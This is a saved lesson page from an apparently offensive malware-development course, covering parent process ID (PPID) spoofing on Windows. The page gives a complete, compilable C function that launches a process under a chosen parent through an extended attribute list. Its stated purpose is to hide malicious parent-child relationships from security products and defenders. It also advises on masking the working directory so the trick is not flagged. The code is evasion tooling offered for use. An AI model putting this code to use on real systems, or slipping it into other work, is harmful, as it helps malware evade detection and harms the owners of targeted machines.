<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Spoofing%20PPID_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Spoofing%20PPID_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Spoofing%20PPID_files/css2.css" rel="stylesheet">
        <link href="Spoofing%20PPID_files/css2_002.css" rel="stylesheet">
        <title>Spoofing PPID</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Spoofing%20PPID_files/app.fdbb573b.css"><link rel="stylesheet" href="Spoofing%20PPID_files/app.fdbb573b.css"><link rel="stylesheet" href="Spoofing%20PPID_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Spoofing%20PPID_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 47 - Spoofing PPID
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Spoofing%20PPID_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Spoofing%20PPID_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Spoofing%20PPID_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/PPidSpoofing" target="_blank">
                    <img src="Spoofing%20PPID_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Spoofing PPID</h2>
<h3>Introduction</h3>
<p><a href="https://attack.mitre.org/techniques/T1134/004/" target="_blank">Parent Process ID (PPID) Spoofing</a>
 is a technique used to alter the PPID of a process, effectively 
disguising the relationship between the child process and its true 
parent process. This can be accomplished by changing the PPID of the 
child process to a different value, making it appear as though the 
process was spawned by a different legitimate Windows process rather 
than the true parent process.</p>
<p>Security solutions and defenders will often look for abnormal parent-child relationships. For example, if Microsoft Word spawns <code>cmd.exe</code> this is generally an indicator of malicious macros being executed. If <code>cmd.exe</code>
 is spawned with a different PPID then it will conceal the true parent 
process and instead appear as if it was spawned by a different process.</p>
<p>In the <em>Early Bird APC Queue Code Injection</em> module, <code>RuntimeBroker.exe</code> was spawned by <code>EarlyBird.exe</code> which can be used by security solutions to detect malicious activity.</p>
<p><img src="Spoofing%20PPID_files/demo-109330271-93c3e529-dfea-4868-ad56-48ce90efe172.png" alt="image"></p>
<h3>Attributes List</h3>
<p>An attribute list is a data structure that stores a list of 
attributes associated with a process or thread. These attributes can 
include information such as the priority, scheduling algorithm, state, 
CPU affinity, and memory address space of the process or thread, among 
other things. Attribute lists can be used to efficiently store and 
retrieve information about processes and threads, as well as to modify 
the attributes of a process or thread at runtime.</p>
<p>PPID Spoofing requires the use and manipulation of a process's 
attributes list to modify its PPID. The use and modification of a 
process's attributes list will be shown in the upcoming sections.</p>
<h3>Creating a Process</h3>
<p>The process of spoofing PPID requires the creation of a process using <code>CreateProcess</code> with the <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags#flags" target="_blank">EXTENDED_STARTUPINFO_PRESENT</a>
 flag being set which is used to give further control of the created 
process. This flag allows some information about the process to be 
modified, such as the PPID information. Microsoft's documentation on <code>EXTENDED_STARTUPINFO_PRESENT</code> states the following:</p>
<p><em>The process is created with extended startup information; the lpStartupInfo parameter specifies a STARTUPINFOEX structure.</em></p>
<p>This means that the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa" target="_blank">STARTUPINFOEXA</a> data structure is also necessary.</p>
<h3>STARTUPINFOEXA Structure</h3>
<p>The <code>STARTUPINFOEXA</code> data structure is shown below:</p>
<pre><code>typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; // Attributes List
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
</code></pre>
<ul>
<li>
<p><code>StartupInfo</code> is the same structure that was used in previous modules to create a new process. Reference <em>Early Bird APC Queue Code Injection</em> &amp; <em>Thread Hijacking - Remote Thread Creation</em> for a refresher. The only member that needs to be set is <code>cb</code> to <code>sizeof(STARTUPINFOEX)</code>.</p>
</li>
<li>
<p><code>lpAttributeList</code> is created using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist" target="_blank">InitializeProcThreadAttributeList</a> WinAPI. This is the attributes list data structure which is discussed in more detail in the following section.</p>
</li>
</ul>
<h3>Initializing The Attributes List</h3>
<p>The <code>InitializeProcThreadAttributeList</code> function is shown below.</p>
<pre><code>BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags, 		// NULL (reserved)
  [in, out]       PSIZE_T                      lpSize
);
</code></pre>
<p>To pass an attribute list that modifies the parent process of the 
created child process, first create the attribute list using the <code>InitializeProcThreadAttributeList</code>
 WinAPI. This API initializes a specified list of attributes for process
 and thread creation. According to Microsoft's documentation, <code>InitializeProcThreadAttributeList</code> must be called twice:</p>
<ol>
<li>
<p>The first call to <code>InitializeProcThreadAttributeList</code> should be <code>NULL</code> for the <code>lpAttributeList</code> parameter. This call is used to determine the size of the attribute list which will be received from the <code>lpSize</code> parameter.</p>
</li>
<li>
<p>The second call to <code>InitializeProcThreadAttributeList</code> should specify a valid pointer for the <code>lpAttributeList</code> parameter. The value of <code>lpSize</code> should be provided as input this time. This call is the one that initializes the attributes list.</p>
</li>
</ol>
<p><code>dwAttributeCount</code> will be set to 1 since only one attribute list is needed.</p>
<h3>Updating The Attributes List</h3>
<p>Once the attribute list has been successfully initialized, use the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute" target="_blank">UpdateProcThreadAttribute</a> WinAPI to add attributes to the list. The function is shown below.</p>
<pre><code>BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // return value from InitializeProcThreadAttributeList 
  [in]            DWORD                        dwFlags,           // NULL (reserved)
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,           // pointer to the attribute value
  [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
  [out, optional] PVOID                        lpPreviousValue,   // NULL (reserved)
  [in, optional]  PSIZE_T                      lpReturnSize       // NULL (reserved)
);
</code></pre>
<ul>
<li>
<code>Attribute</code> - This flag is critical for PPID spoofing and 
states what should be updated in the attribute list. In this case, it 
needs to be set to the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> flag to update the parent process information.</li>
</ul>
<p>The <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> flag specifies 
the parent process of the thread. In general, the parent process of a 
thread is the process that created the thread. If a thread is created 
using the <code>CreateThread</code> function, the parent process is the one that called the <code>CreateThread</code> function. If a thread is created as part of a new process using the <code>CreateProcess</code>
 function, the parent process is the new process. Updating the parent 
process of a thread will also update the parent process of the 
associated process.</p>
<ul>
<li>
<p><code>lpValue</code> - The handle of the parent process.</p>
</li>
<li>
<p><code>cbSize</code> - The size of the attribute value specified by the <code>lpValue</code> parameter. This will be set to <code>sizeof(HANDLE)</code>.</p>
</li>
</ul>
<h3>Implementation Logic</h3>
<p>The steps below sum up the required actions to perform PPID spoofing.</p>
<ol>
<li>
<p><code>CreateProcessA</code> is called with the <code>EXTENDED_STARTUPINFO_PRESENT</code> flag to provide further control over the created process.</p>
</li>
<li>
<p>The <code>STARTUPINFOEXA</code> structure is created which contains the attributes list, <code>LPPROC_THREAD_ATTRIBUTE_LIST</code>.</p>
</li>
<li>
<p><code>InitializeProcThreadAttributeList</code> is called to 
initialize the attributes list. The function must be called twice, the 
first time determines the size of the attributes list and the next call 
is the one that performs the initialization.</p>
</li>
<li>
<p><code>UpdateProcThreadAttribute</code> is used to update the attributes by setting the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> flag which allow the user to specify the parent process of the thread.</p>
</li>
</ol>
<h3>PPID Spoofing Function</h3>
<p><code>CreatePPidSpoofedProcess</code> is a function that creates a process with a spoofed PPID. The function takes 5 arguments:</p>
<ul>
<li>
<p><code>hParentProcess</code> - A handle to the process that will become the parent of the newly created process.</p>
</li>
<li>
<p><code>lpProcessName</code> - The name of the process to create.</p>
</li>
<li>
<p><code>dwProcessId</code> - A pointer to a DWORD that receives the newly created process's PID.</p>
</li>
<li>
<p><code>hProcess</code> - A pointer to a HANDLE that receives a handle to the newly created process.</p>
</li>
<li>
<p><code>hThread</code> - A pointer to a HANDLE that receives a handle to the newly created process's thread.</p>
</li>
</ul>
<pre><code>BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath               [MAX_PATH * 2];
	CHAR                               WnDr                 [MAX_PATH];

	SIZE_T                             sThreadAttList       = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;

	STARTUPINFOEXA                     SiEx                = { 0 };
	PROCESS_INFORMATION                Pi                  = { 0 };

	RtlSecureZeroMemory(&amp;SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	
	//-------------------------------------------------------------------------------
	
	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(NULL, 1, NULL, &amp;sThreadAttList);	

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &amp;sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&amp;SiEx.StartupInfo,
		&amp;Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;


	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
		return TRUE;

	return FALSE;
}
</code></pre>
<h3>Demo</h3>
<p>Creating the child process, <code>RuntimeBroker.exe</code>, with parent <code>svchost.exe</code> that has a PID of <code>21956</code>. Note that this <code>svchost.exe</code> process is running with normal privileges.</p>
<p><img src="Spoofing%20PPID_files/ppid-spoofing-1209528890-4c267ff2-a7b9-4036-8279-a5af58f067c.png" alt="image"></p>
<br>
<p>PPID Spoofing is successful. The <code>RuntimeBroker.exe</code> process appears as if it was spawned by <code>svchost.exe</code>.</p>
<p><img src="Spoofing%20PPID_files/ppid-spoofing-209529234-c72226c9-0cf1-401f-b46d-6b32cb1bac25.png" alt="image"></p>
<br>
<h3>Demo 2 - Updating Current Directory</h3>
<p>Notice in the previous demo how the "Current Directory" value points to the directory of the <code>PPidSpoofing.exe</code> binary.</p>
<p><img src="Spoofing%20PPID_files/ppid-spoofing-309529480-978dfe1a-ba61-4881-a33d-9614bd7ee3bb.png" alt="image"></p>
<br>
<p>This can easily be an IoC and security solutions or defenders may quickly flag this anomaly. To fix this, simply set the <code>lpCurrentDirectory</code> parameter in <code>CreateProcess</code> WinAPI to a less suspicious directory, such as "C:\Windows\System32".</p>
<p><img src="Spoofing%20PPID_files/ppid-spoofing-409530891-f8b81cc4-8cec-4ffe-b413-debf5f051ae8.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Familiarize yourself with a process's attributes list and understand how to initialize and update them</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Check UpdateProcThreadAttribute's Windows documentation and view what other attributes can be updated</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Add process enumeration functionality into the PPID function to programmatically fetch a parent process's handle.</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/46"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/47/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/47/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/48"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Spoofing%20PPID_files/jquery-3.6.0.min.js"></script>
        <script src="Spoofing%20PPID_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Spoofing%20PPID_files/app.4474f4d1.css"><link rel="modulepreload" href="Spoofing%20PPID_files/app.5f3af5ce.js"><link rel="stylesheet" href="Spoofing%20PPID_files/app.4474f4d1.css"><script type="module" src="Spoofing%20PPID_files/app.5f3af5ce.js"></script><script src="Spoofing%20PPID_files/navbar.js"></script>
<script src="Spoofing%20PPID_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 47;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>